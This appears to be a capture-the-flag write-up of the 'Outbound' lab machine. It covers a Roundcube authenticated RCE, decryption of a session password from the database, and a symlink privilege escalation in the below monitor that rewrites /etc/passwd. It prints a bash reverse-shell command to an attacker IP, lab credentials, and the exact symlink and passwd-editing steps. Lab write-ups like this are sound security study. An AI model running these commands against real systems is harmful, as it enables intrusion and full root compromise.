+++
date = '2026-08-05T23:43:53+02:00'
draft = false
title = 'Outbound Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`11/07/2025`**

![Outbound.png](/images/imgs_outbound/Outbound.png)

---
# Introduction

**_Outbound_** is an **Easy-level Linux** machine that simulates an **assume breach** scenario. 

The initial foothold requires leveraging provided credentials to access a **Roundcube Webmail** instance, which is vulnerable to an **authenticated Remote Code Execution** flaw (**CVE-2025-49113**). After gaining access as **`www-data`**, lateral movement involves enumerating the internal **MySQL database** to extract an **encrypted session token**, and using **Roundcube**'s own built-in scripts to decrypt it and pivot to the user **`jacob`**.
Finally, Privilege Escalation focuses on a misconfigured system monitor binary called **below**. By exploiting a known vulnerability (**CVE-2025-27591**) related to insecure log handling, I was able to perform a **symlink attack** to overwrite the permissions of **`/etc/passwd`** and easily switch to **root**.

---
# Techniques Used

- **Roundcube Webmail RCE (CVE-2025-49113)**
- **Database Dump & Session Password Decryption**
- **Symlink Attack (CVE-2025-27591)**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- outbound
```

```text
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
4853/tcp  filtered unknown
5563/tcp  filtered unknown
5776/tcp  filtered unknown
9986/tcp  filtered kaostransport
11095/tcp filtered weave
... [snip] ...
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV outbound
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to [http://mail.outbound.htb/](http://mail.outbound.htb/)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

I added **`mail.outbound.htb`** to my **`/etc/hosts`** file.

---
# Initial Access | Roundcube RCE (CVE-2025-49113)

Navigating to the web page revealed a **Roundcube Webmail** login instance. Since this is an **assume breach** scenario, I logged in using the provided credentials.

Checking the "**About**" section, I immediately noticed the version was **`1.6.10`**.

![version.png](/images/imgs_outbound/version.png)

Searching online, I found this version is vulnerable to **CVE-2025-49113**.

- **(detailed research by [fearsoff.org](https://fearsoff.org/research/roundcube))**.

**Note**: _**CVE-2025-49113** is a **Post-Authentication Remote Code Execution** vulnerability in **Roundcube**. It arises from improper sanitization of user-supplied data in the mail handling or settings configuration, allowing an authenticated attacker to inject and **execute arbitrary PHP/system commands** on the underlying web server._

I found a **PoC** exploit written by the same author of the article. 

- **https://github.com/fearsoff-org/CVE-2025-49113**

I ran the exploit and instantly gained initial access as the **`www-data`** user:

```bash
php CVE-2025-49113.php [http://mail.outbound.htb](http://mail.outbound.htb) tyler LhKL1o9Nm3X2 "bash -c 'bash -i >& /dev/tcp/<attacker_ip>/22667 0>&1'"
```

![initial_access.png](/images/imgs_outbound/initial_access.png)

---
# Lateral Movement | Database Dump & Decryption

Once I land a shell on a web server, my first instinct is always to hunt for **database** credentials. I checked the **Roundcube** configuration file:

```bash
cat config.inc.php
```

![db_info.png](/images/imgs_outbound/db_info.png)

The database password and the encryption **`des_key`** were leaked inside.

I tried connecting to the **DB**, but my shell kept hanging. To fix this, I upgraded my shell to a fully interactive **TTY**:

```bash
/usr/bin/script -qc /bin/bash /dev/null
```

- **Source: https://github.com/RoqueNight/Reverse-Shell-TTY-Cheat-Sheet**

With a stable shell, I connected to the database:

```bash
mysql -u roundcube -p
```

![db.png](/images/imgs_outbound/db.png)

I started retrieving information. The **`users`** table contained some "hashes", but they turned out to be just a **rabbit hole**.

![db1.png](/images/imgs_outbound/db1.png)

Moving on, I dumped the **`sessions`** table and found an interesting **base64 blob**. 

![db2.png](/images/imgs_outbound/db2.png)

Decoding it revealed the username **jacob** alongside an **encrypted password string**.

![db3.png](/images/imgs_outbound/db3.png)

I researched how **Roundcube** encrypts its session passwords and learned it uses **3DES** with the **secret key** that was also stored in **`config.inc.php`**.

![info2.png](/images/imgs_outbound/info2.png)

**Roundcube** natively provides a **`decrypt.sh`** binary to reverse this exact encryption.

**Note**: _The first time I played this machine when it was active, I completely missed the fact that **Roundcube** comes with its own native **decryption script**. I wasted an embarrassing amount of time searching online and eventually used a custom **Python decryption script** generated by an **AI**... Fuck me._

![retard.png](/images/imgs_outbound/retard.png)

I used it with the encrypted string to reveal **Jacob**'s password:

```bash
./decrypt.sh L7Rv00A8TuwJAr67kITxxcSgnIk25Am/
su jacob
```

![decrypt.png](/images/imgs_outbound/decrypt.png)

---
# Privilege Escalation | below Symlink Attack (CVE-2025-27591)

Inside **Jacob**'s home directory, I found some internal emails from the user **mel** leaking a password and hinting at some special privileges needed to inspect system logs.

![mail.png](/images/imgs_outbound/mail.png)

![mail2.png](/images/imgs_outbound/mail2.png)

I tried running **`sudo -l`**, but received a **`sudo: command not found`** error because of my current shell environment. To get a proper session, I connected directly via **SSH** using **Jacob**'s credentials:

```bash
ssh jacob@outbound
sudo -l
```

![sudol.png](/images/imgs_outbound/sudol.png)

I checked **GTFOBins** for **`/usr/bin/below`** but found nothing. So, I literally googled "**below cve lpe**" and discovered a recent **Local Privilege Escalation** vulnerability: **[CVE-2025-27591](https://www.miggo.io/vulnerability-database/cve/CVE-2025-27591)**.

**Note**: _**CVE-2025-27591** is a vulnerability in the below system monitor. The flaw exists because the service writes error logs to a world-writable directory (**`/var/log/below`**) without properly checking for **symbolic links**. When the application is forced to log an error while running as **root**, it will follow any **symlink** placed in that directory and forcefully change the target file's permissions to **`0666`** (**read/write for everyone**)._

To fully understand the exploit flow, I analyzed a public **PoC** script:

- **[BridgerAlderson/CVE-2025-27591-PoC](https://github.com/BridgerAlderson/CVE-2025-27591-PoC)**

which breaks down into three simple steps:

1. **Symlink Creation**: Replace the log file **`/var/log/below/error_root.log`** with a **symlink** pointing to **`/etc/passwd`**.

2. **Triggering the Error**: Run **`sudo /usr/bin/below record`** to force the service to write an error. Running as **root**, it follows the **symlink** and overwrites the permissions of **`/etc/passwd`** to **`0666`**.

3. **Backdoor Injection**: Edit the now-writable **`/etc/passwd`** file to escalate privileges (either by adding a new **`UID 0`** user or stripping the **root** password).

I still executed the attack manually. First, I set up the **symlink**:

```bash
rm /var/log/below/error_root.log && ln -s /etc/passwd /var/log/below/error_root.log
```

![privesc1.png](/images/imgs_outbound/privesc1.png)

Then, I triggered the binary via **sudo** (which forced the error and changed the permissions of **`/etc/passwd`**). 

![privesc2.png](/images/imgs_outbound/privesc2.png)

Finally, I opened the file with nano and simply removed the **`x`** from the **root** user line (changing **`root:x:0:0`**... to **`root::0:0`**...), which allows logging in as **root** without a password.

```bash
su root
```

![rootf.png](/images/imgs_outbound/rootf.png)

Root owned.

---
# Final Thoughts

**_Outbound_** is the perfect **Easy** machine.

The foothold is a very realistic **assume breach** scenario, and navigating the internal database to extract encrypted sessions was something new to me. My initial oversight with the **`decrypt.sh`** script was a humbling reminder to always enumerate the tools already available on the system before trying to reinvent the wheel.

The Privilege Escalation phase was brilliant. Exploiting insecure file permissions via a **Symlink Attack** is an elegant technique that highlights exactly why world-writable log directories are so dangerous.

**Sources**:

- **Roundcube RCE (CVE-2025-49113) | https://fearsoff.org/research/roundcube**

- **Roundcube PoC | https://github.com/fearsoff-org/CVE-2025-49113**

- **TTY Upgrade Cheat Sheet | https://github.com/RoqueNight/Reverse-Shell-TTY-Cheat-Sheet**

- **below Symlink LPE (CVE-2025-27591) | https://www.miggo.io/vulnerability-database/cve/CVE-2025-27591**

- **below PoC | https://github.com/BridgerAlderson/CVE-2025-27591-PoC**